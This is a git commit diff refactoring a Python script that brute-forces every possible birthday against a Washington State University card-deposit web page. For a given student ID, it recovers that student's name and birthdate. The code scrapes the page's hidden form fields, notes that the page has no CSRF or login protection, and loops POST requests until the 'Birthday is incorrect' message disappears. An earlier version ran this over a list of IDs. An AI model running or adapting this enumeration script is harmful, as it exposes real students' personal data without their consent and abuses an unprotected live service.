56657c324943e67eb080fa56be271e2e794c2a9d
ryanmanny <ryan.manny@wsu.edu>
2019-01-29 11:03:22 -0800

    Style refactor

--- birthdays.py
+++ birthdays.py
@@ -1,14 +1,20 @@
 from collections import namedtuple
 import calendar
 
-Birthday = namedtuple('Birthday', 'month day')
-birthdays = []  # All possible birthdays
-for month in range(1, 13):
-    for day in calendar.Calendar(0).itermonthdays(2000, month):
-        if day != 0:
-            birthdays.append(
-                Birthday(
-                    str(month).zfill(2),  # Servers reject "1" for "01", which is frightening
-                    str(day).zfill(2)
-                )
-            )
+
+class Birthday(namedtuple('Birthday', 'month day')):
+    pass
+
+
+def get_birthdays():
+    return [
+        Birthday(
+            str(month).zfill(2),  # Servers reject "1" for "01", frightening
+            str(day).zfill(2),
+        )
+        for month in range(1, 13)  # January to December
+        for day in calendar.Calendar(0).itermonthdays(2000, month) if day != 0
+    ]  # All possible birthdays
+
+
+birthdays = get_birthdays()
--- wsu_finder.py
+++ wsu_finder.py
@@ -1,61 +1,61 @@
+import sys
+
 import requests
 from bs4 import BeautifulSoup
 
-from ids import id_to_score
 from birthdays import birthdays
+
+ENDPOINT = "https://livingat.wsu.edu/cardinfo/deposit/default.aspx?mode=CC"
 
 s = requests.session()
 
 
 # TODO: Async requests
-def get_info(wsu_id):
-    response = s.get(
-        "https://livingat.wsu.edu/cardinfo/deposit/default.aspx?mode=CC",
-    )
+def get_info_for_wsu_id(wsu_id):
+    response = s.get(ENDPOINT)
     bs = BeautifulSoup(response.text, 'html.parser')
 
-    # Get hidden inputs
+    # Get hidden inputs to recreate request
+    # No CSRF token because no login required
     view_state = bs.find(id="__VIEWSTATE").get('value')
-    prev_page = bs.find(id="__PREVIOUSPAGE").get('value')
+    prev_page = bs.find(id="__PREVIOUSPAGE").get('value')  # Mayn't be necessary
     event_val = bs.find(id="__EVENTVALIDATION").get('value')
 
     for birthday in birthdays:
-        print("Trying {} on ID {}".format(birthday, wsu_id))
+        # Brute force every possible birthday for the WSU ID
+        print(f"Trying {birthday} on ID {wsu_id}")
         response = s.post(
-            "https://livingat.wsu.edu/cardinfo/deposit/default.aspx?mode=CC",
+            ENDPOINT,
             data={
+                # Hidden fields
                 "__EVENTTARGET": "ctl00$mainContent$btnContinue",
                 "__VIEWSTATE": view_state,
                 "__PREVIOUSPAGE": prev_page,
                 "__EVENTVALIDATION": event_val,
+                # POST data that user would usually provide
                 "ctl00$mainContent$txtWSUID": wsu_id,
                 "ctl00$mainContent$DropDownListMonth": birthday.month,
                 "ctl00$mainContent$DropDownListDay": birthday.day,
             },
         )
 
-        if "Birthday is incorrect" not in response.text:
+        if "Birthday is incorrect" not in response.text:  # TODO: Better check
+            # We hit the jackpot
             bs = BeautifulSoup(response.text, 'html.parser')
             name = bs.find(id="ctl00_mainContent_lblName").text.lstrip(" - ")
             return name, birthday
     else:
-        raise ValueError("{} has no birthday!".format(wsu_id))
-
-
-def get_all_info(wsu_ids):
-    all_info = {}
-    for wsu_id in wsu_ids:
-        info = get_info(wsu_id)
-
-        all_info[wsu_id] = info
-
-    return all_info
+        raise ValueError(f"{wsu_id} has no birthday! It probably doesn't exist")
 
 
 def main():
-    all_info = get_all_info(id_to_score)
-
-    print(all_info)
+    try:
+        print(get_info_for_wsu_id(sys.argv[1]))
+    except IndexError:
+        print("Usage: python wsu_finder.py wsu_id")
+    except Exception:
+        print(f"Invalid argument {sys.argv[1]}")
+        raise
 
 
 if __name__ == '__main__':
